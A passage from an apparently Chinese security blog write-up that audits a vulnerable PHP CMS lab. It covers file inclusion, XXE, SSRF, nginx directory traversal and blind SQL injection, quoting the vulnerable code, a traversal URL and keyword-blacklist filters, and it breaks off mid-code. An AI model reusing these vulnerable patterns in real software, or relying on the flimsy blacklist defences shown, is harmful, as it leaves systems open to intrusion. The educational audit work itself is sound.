+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420142620521.png" srcset="/img/loading.gif" alt="image-20210420142620521" style="zoom: 67%;">
+</li>
+<li><p><strong>方法二</strong></p>
+<p>在代码中限制提交上的文件名，因为只需要包含<code>about.php</code>，所以检查提交上<code>$file</code>是否为<code>about.php</code></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$file</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
+      <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) || <span class="hljs-variable">$file</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;
+          <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;info.php&#x27;</span>;
+      &#125;
+      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;info.php&quot;</span>)&#123;
+          <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;文件名错误！&quot;</span>)
+      &#125;
+      <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>&quot;</span>;</code></pre></div>
+
+
+
+</li>
+</ul>
+<h2 id="2-XXE-1"><a href="#2-XXE-1" class="headerlink" title="2.XXE"></a>2.XXE</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>application\advice\controller\Index.php</code></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+
+        <span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;
+        <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span>;
+        libxml_disable_entity_loader(<span class="hljs-literal">false</span>);
+        <span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);
+
+        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$xmlfile</span> !== <span class="hljs-string">&quot;&quot;</span>)&#123;
+            <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();
+            <span class="hljs-comment">// var_dump($dom);</span>
+            <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);
+            <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);
+
+            <span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;
+            <span class="hljs-variable">$info</span> = <span class="hljs-variable">$creds</span>-&gt;info;
+
+            <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;yzncms&quot;</span>);
+            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;
+                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());
+            &#125;
+            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO yzn_new (name, info) values(&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$info</span>&#x27;)&quot;</span>;
+            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>))&#123;
+                <span class="hljs-variable">$code</span> = <span class="hljs-number">1</span>;
+                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;提交成功！&#x27;)&lt;/script&gt;&quot;</span>;
+                <span class="hljs-variable">$result</span> = sprintf(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);
+            &#125;<span class="hljs-keyword">else</span>&#123;
+                <span class="hljs-variable">$result</span> = sprintf(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);
+            &#125;
+        &#125;</code></pre></div>
+
+
+
+<p>前端代码</p>
+<div class="hljs"><pre><code class="hljs html">var data = &quot;<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>&quot; + username + &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">info</span>&gt;</span>&quot; + info + &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">info</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>&quot;;
+            $.ajax(&#123;
+                type: &quot;POST&quot;,
+                url: &quot;/advice/index&quot;,
+                contentType: &quot;application/xml;charset=utf-8&quot;,
+                data: data,
+                dataType: &quot;xml&quot;,
+                anysc: false,
+                success: function (result) &#123;
+                    var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;
+                    if(code === &quot;0&quot;)&#123;
+                        $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;fail!&quot;);
+                    &#125;else &#123;
+                        $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;success!&quot;);
+                    &#125;
+                &#125;,
+            &#125;);</code></pre></div>
+
+<p>上面的两端代码，一个是前端的数据传送，一个是后端的数据处理</p>
+<p>可以看到前端将用户提交的数据一xml格式以post方式发送给后端，而在后端中使用了<code>$xmlfile = file_get_contents(&#39;php://input&#39;);</code>，可以看到这里不仅使用了file_get_contents，而且使用了php伪协议<code>php://input</code>，这个协议可以读取用户用post方式提交的数据，这就意味着攻击者可以使用抓包的方式修改自己所提交的数据，从而引入外部实体，造成XXE漏洞，而最主要的原因是这段代码，这个函数参数伪true时，就是禁止引入外部实体，而这里选择了false</p>
+<div class="hljs"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">libxml_disable_entity_loader</span>(<span class="hljs-variable"><span class="hljs-literal">false</span></span>)</span></code></pre></div>
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210330213939369.png" srcset="/img/loading.gif" alt="image-20210330213939369" style="zoom:67%;">
+
+<h3 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul>
+<li><p><strong>方法一</strong></p>
+<p>使用所开发的语言提供的禁用外部实体的方法</p>
+<p>php中的是</p>
+<p>也就是这个漏洞的防御方法</p>
+<div class="hljs"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">libxml_disable_entity_loader</span>(<span class="hljs-variable"><span class="hljs-literal">true</span></span>);</span></code></pre></div>
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420141804839.png" srcset="/img/loading.gif" alt="image-20210420141804839" style="zoom: 80%;">
+
+<p>java:</p>
+</li>
+</ul>
+<div class="hljs"><pre><code class="hljs reasonml">  DocumentBuilderFactory dbf =<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DocumentBuilderFactory</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;
+dbf.set<span class="hljs-constructor">ExpandEntityReferences(<span class="hljs-params">false</span>)</span>;</code></pre></div>
+
+<p>  python:</p>
+  <div class="hljs"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> lxml import etree
+xmlData = etree.parse(xmlSource,etree.XMLParser(<span class="hljs-attribute">resolve_entities</span>=<span class="hljs-literal">False</span>))</code></pre></div>
+
+
+
+<ul>
+<li><p><strong>方法二</strong></p>
+<p>代码层面的防御，在代码中添加对用户提交数据的检测函数</p>
+<p>比如</p>
+<div class="hljs"><pre><code class="hljs erlang-repl">&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC</code></pre></div>
+
+<p>上面的关键词是XMl实体中不可缺少的关键词，所以过滤后，可以大概率的防止XXE攻击</p>
+</li>
+</ul>
+<h2 id="3-SSRF-1"><a href="#3-SSRF-1" class="headerlink" title="3.SSRF"></a>3.SSRF</h2><h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>application\info\controller\Index.php</code></p>
+<div class="hljs"><pre><code class="hljs php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable">$url</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
+        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>) || <span class="hljs-variable">$url</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;
+            <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;https://sunzy.icu&#x27;</span>;
+        &#125;
+        <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;https://sunzy.icu&#x27;</span>;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$url</span>) &#123;
+            <span class="hljs-variable">$ch</span> = curl_init();
+            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
+            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
+            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
+            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">false</span>);
+            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">false</span>);
+            <span class="hljs-variable">$co</span> = curl_exec(<span class="hljs-variable">$ch</span>);
+            curl_close(<span class="hljs-variable">$ch</span>);
+            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$co</span>;
+        &#125;
+<span class="hljs-comment">//        return view();</span>
+    &#125;</code></pre></div>
+
+<p>在上面的代码中，需要接收一个参数<code>url</code>，如果参数为空，则赋值为<code>https://sunzy.icu</code>，否则直接进行curl初始化，然后进行访问，可以看到没有对提交的参数进行任何的检查和过滤，这是很危险的。</p>
+<h3 id="漏洞防御-2"><a href="#漏洞防御-2" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul>
+<li><strong>方法一</strong></li>
+</ul>
+<p>黑名单 内网过滤，端口限制，协议限制只允许使用http/https</p>
+<p>在这个系统中防御该SSRF漏洞其实非常简单，就是禁止提交参数，或者绑定参数代码如下</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-comment">//只允许http和https协议</span>
+    <span class="hljs-variable">$match_result</span> = preg_match(<span class="hljs-string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>, <span class="hljs-variable">$url</span>);
+    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);
+    &#125;
+    <span class="hljs-keyword">try</span> &#123;
+        <span class="hljs-variable">$url_parse</span> = parse_url(<span class="hljs-variable">$url</span>);
+    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);
+    &#125;
+    <span class="hljs-variable">$hostname</span> = <span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];
+    <span class="hljs-variable">$ip</span> = gethostbyname(<span class="hljs-variable">$hostname</span>);
+    <span class="hljs-variable">$int_ip</span> = ip2long(<span class="hljs-variable">$ip</span>);
+    <span class="hljs-comment">//不允许host为内网ip地址</span>
+    <span class="hljs-keyword">return</span> ip2long(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">20</span> || ip2long(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">16</span>;
+&#125;</code></pre></div>
+
+
+
+<ul>
+<li><p><strong>方法二</strong></p>
+<p>对于一般的SSRF防御，一般从一下几方面入手</p>
+<ul>
+<li><p>限制协议为HTTP、HTTPS</p>
+</li>
+<li><p>不用限制302重定向</p>
+</li>
+<li><p>设置URL白名单或者限制内网IP</p>
+</li>
+<li><p>限制请求的端口为http常用的端口，比如，80,443,8080,8090</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>下面是自己编写的WAF</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://baidu.com/test&quot;</span>;
+<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/file|ftp|tftp|gopher|dict|localhost|127\.0\.0\.1|3232235521|2130706433|0x|0177\.0\.0\.01|0\.0\.0\.0|xip|@/i&quot;</span>,<span class="hljs-variable">$url</span>))&#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;you are a hacker!!!&quot;</span>);
+&#125;</code></pre></div>
+
+<p>解释一下为什么要用上面的正则过滤url</p>
+<ul>
+<li><p>file|ftp|tftp|gopher|dict</p>
+<p>是让改url只能使用http/https协议，这样可以避免大部分的攻击。</p>
+</li>
+<li><p>localhost|127.0.0.1</p>
+<p>是为了防止攻击者探测内网端口，以免泄露一些容易被攻击的应用程序</p>
+</li>
+<li><p>3232235521|2130706433|0x|0177.0.0.01|0.0.0.0</p>
+<p>这几个是为了防止攻击者对127.0.0.1进行八进制，十六进制，十进制的转码，从而绕过之前的检测</p>
+</li>
+<li><p>xip|@</p>
+<p>这两个是防止攻击者使用302跳转攻击</p>
+</li>
+</ul>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420142252510.png" srcset="/img/loading.gif" alt="image-20210420142252510" style="zoom: 33%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420142336577.png" srcset="/img/loading.gif" alt="image-20210420142336577" style="zoom: 33%;"></p>
+<h2 id="4-目录遍历-1"><a href="#4-目录遍历-1" class="headerlink" title="4.目录遍历"></a>4.目录遍历</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>nginx.conf</code></p>
+<div class="hljs"><pre><code class="hljs awk">location /files &#123;
+		  autoindex on;
+        alias  <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/public/u</span>ploads/;
+&#125;</code></pre></div>
+
+<p>files后少写一个/</p>
+<p>输入url<code>http://192.168.164.147/files../</code>时，相当于访问的是<code>/var/www/public/uploads/../</code>，所以访问的就是<code>/var/www/public/</code>目录。</p>
+<h3 id="漏洞防御-3"><a href="#漏洞防御-3" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>该漏洞修复方法很简单</p>
+<p>修改<code>nginx.conf</code></p>
+<div class="hljs"><pre><code>location /files/ &#123;
+          autoindex on;
+        alias  /var/www/public/uploads/;
+&#125;</code></pre></div><h2 id="5-SQL注入"><a href="#5-SQL注入" class="headerlink" title="5.SQL注入"></a>5.SQL注入</h2><h3 id="漏洞点一-5"><a href="#漏洞点一-5" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h4><p>代码位置<code>application\change\controller\Changepass.php</code></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
+        <span class="hljs-variable">$account</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;account&#x27;</span>];
+        <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
+        <span class="hljs-variable">$npassword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;npassword&#x27;</span>];
+        <span class="hljs-variable">$newpassword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;newpassword&#x27;</span>];
+        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$account</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-variable">$npassword</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-variable">$newpassword</span> !=<span class="hljs-string">&#x27;&#x27;</span>)&#123;
+            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$npassword</span> === <span class="hljs-variable">$newpassword</span>) &#123;
+                <span class="hljs-variable">$result</span> = Db::query(<span class="hljs-string">&quot;select `username` from yzn_member where username=&#x27;<span class="hljs-subst">$account</span>&#x27;&quot;</span>);
+                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>)) &#123;
+                    <span class="hljs-variable">$sql</span> = Db::query(<span class="hljs-string">&quot;select `password`,`encrypt` from yzn_member where username=&#x27;<span class="hljs-subst">$account</span>&#x27;&quot;</span>);
+                    <span class="hljs-variable">$encrypt</span> = <span class="hljs-variable">$sql</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;encrypt&#x27;</span>];
+                    <span class="hljs-variable">$encrypt_password</span> = <span class="hljs-variable">$password</span> . <span class="hljs-variable">$encrypt</span>;
+                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$sql</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;password&#x27;</span>] === md5(<span class="hljs-variable">$encrypt_password</span>)) &#123;
+                        <span class="hljs-variable">$pwd</span> = md5(<span class="hljs-variable">$newpassword</span>.<span class="hljs-variable">$encrypt</span>);
+                        <span class="hljs-variable">$change</span> = Db::query(<span class="hljs-string">&quot;UPDATE `yzn_member` SET `password`=&#x27;<span class="hljs-subst">$pwd</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$account</span>&#x27;&quot;</span>);
+                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&quot;successful!&quot;</span>);
+                    &#125; <span class="hljs-keyword">else</span> &#123;
+                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;wrong password!&quot;</span>);
+                    &#125;
+                &#125; <span class="hljs-keyword">else</span> &#123;
+                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;no user!&quot;</span>);
+                &#125;
+            &#125;
+            <span class="hljs-keyword">else</span>&#123;
+                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;new password are different!&quot;</span>);
+            &#125;
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;please input content!!!&quot;</span>);
+        &#125;
+    &#125;</code></pre></div>
+
+<p>这段代码的意思就是，先检查用户的输入是否为空，不为空则判断两次输入的新密码是否一样，一样先到数据库中查找该用户，如果有该用户，则取出该用户的密码和加密因子，然后判断旧密码是否正确，正确则将新密码和加密因子的md5值写入数据库，密码修改成功。</p>
+<p>这里可以看到并没有返回查询的信息，但是也没有对用户输入的数据进行检查和过滤，所以攻击根据错误提示进行盲注攻击。</p>
+<h4 id="漏洞防御-4"><a href="#漏洞防御-4" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><ul>
+<li><p><strong>方法一</strong></p>
+<p>对sql注入使用的关键词进行过滤，写一个waf对输入的数据进行检查</p>
+<p>这里的话只需要对用户名进行过滤，因为只有用户名被带入到sql语句中进行查询</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span>(<span class="hljs-params"><span class="hljs-variable">$Sql_Str</span></span>) </span>&#123;<span class="hljs-comment">//检测Sql的注入语句。</span>
+   <span class="hljs-variable">$check</span>=preg_match(<span class="hljs-string">&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;</span>,<span class="hljs-variable">$Sql_Str</span>);
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$check</span>) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;hacker!!!&quot;</span>)
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Sql_Str</span>;
+    &#125;
+&#125;</code></pre></div>
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420144316454.png" srcset="/img/loading.gif" alt="image-20210420144316454" style="zoom:67%;">
+
+<p>可以看到使用bp进行注入fuzzing，可以发现很多payload都已经被过滤</p>
+</li>
+<li><p><strong>方法二</strong></p>
+<p>第一种方法很简单，就是限制用户名和密码的长度，然后对用户的输入进行长度限制</p>
+<p>因为是用户名和密码位置，用户名的长度一般不会超过20个字符，密码也不会超过20个字符，那么这里只需要在用户提交完数据后，在后端检测用户名和密码的长度，这样就可以让sql注入攻击无法发挥威力，因为在20个字符范围之内很难构造出有效的攻击语句。</p>
+</li>
+</ul>
+<h3 id="漏洞点二-5"><a href="#漏洞点二-5" class="headerlink" title="漏洞点二"></a><strong>漏洞点二</strong></h3><h4 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h4><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jifen</span>(<span class="hljs-params"></span>)</span>&#123;
+    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;&quot;</span>;
+    <span class="hljs-variable">$point</span>=<span class="hljs-number">0</span>;
+    <span class="hljs-variable">$id</span> = <span class="hljs-keyword">$this</span>-&gt;userid;
+    <span class="hljs-variable">$sql</span> = Db::query(<span class="hljs-string">&quot;select `point` from yzn_member where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];
+    <span class="hljs-variable">$point</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;point&#x27;</span>];
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]!==<span class="hljs-string">&#x27;&#x27;</span>)&#123;
+        <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];
+        <span class="hljs-variable">$num</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>];
+        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> !== <span class="hljs-keyword">$this</span>-&gt;userinfo[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$num</span> &lt;= <span class="hljs-variable">$point</span>)&#123;
+            <span class="hljs-variable">$result</span> = Db::query(<span class="hljs-string">&quot;select `point` from yzn_member where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];
+            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>))&#123;
+                <span class="hljs-variable">$new_point</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;point&#x27;</span>] + <span class="hljs-variable">$num</span>;
+                <span class="hljs-variable">$point</span> = <span class="hljs-variable">$point</span> - <span class="hljs-variable">$num</span>;
+                Db::query(<span class="hljs-string">&quot;UPDATE `yzn_member` SET `point`=&#x27;<span class="hljs-subst">$point</span>&#x27; WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>);
+                Db::query(<span class="hljs-string">&quot;UPDATE `yzn_member` SET `point`=&#x27;<span class="hljs-subst">$new_point</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);
+                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;成功向&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;赠送&quot;</span>.(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$num</span>.<span class="hljs-string">&quot;积分!&quot;</span>;
+                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/jifen&#x27;</span>,[<span class="hljs-string">&#x27;point&#x27;</span>=&gt;<span class="hljs-variable">$point</span>,<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);
+            &#125;<span class="hljs-keyword">else</span>&#123;
+                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;不存在该用户！&quot;</span>;
+                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/jifen&#x27;</span>,[<span class="hljs-string">&#x27;point&#x27;</span>=&gt;<span class="hljs-variable">$point</span>,<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);
+            &#125;
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;注意用户名不能是自己且积分数点数需要小于自己当前积分!&quot;</span>;
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/jifen&#x27;</span>,[<span class="hljs-string">&#x27;point&#x27;</span>=&gt;<span class="hljs-variable">$point</span>,<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);
+        &#125;
+    &#125;</code></pre></div>
+
+<p>在这段代码中会将用户提交的用户名带到sql语句中查询</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$result</span> = Db::query(<span class="hljs-string">&quot;select `point` from yzn_member where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];</code></pre></div>
+
+<p>虽然此处没有返回值，但是如果查询失败就会提示<code>$msg=&quot;不存在该用户！&quot;</code>，导致攻击者可以使用盲注攻击</p>
+<h4 id="漏洞防御-5"><a href="#漏洞防御-5" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>同样可以直接使用上面的过滤函数</p>
+<h3 id="漏洞点三-3"><a href="#漏洞点三-3" class="headerlink" title="漏洞点三"></a><strong>漏洞点三</strong></h3><h4 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>application\member\controller\Index.php</code>中的<code>finduser</code>方法</p>
+<div class="hljs"><pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">finduser</span>(<span class="hljs-params"></span>)</span>&#123;
+  	<span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;
+<span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;&#x27;</span>;	
+      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]!==<span class="hljs-string">&#x27;&#x27;</span>)&#123;
+      	<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];
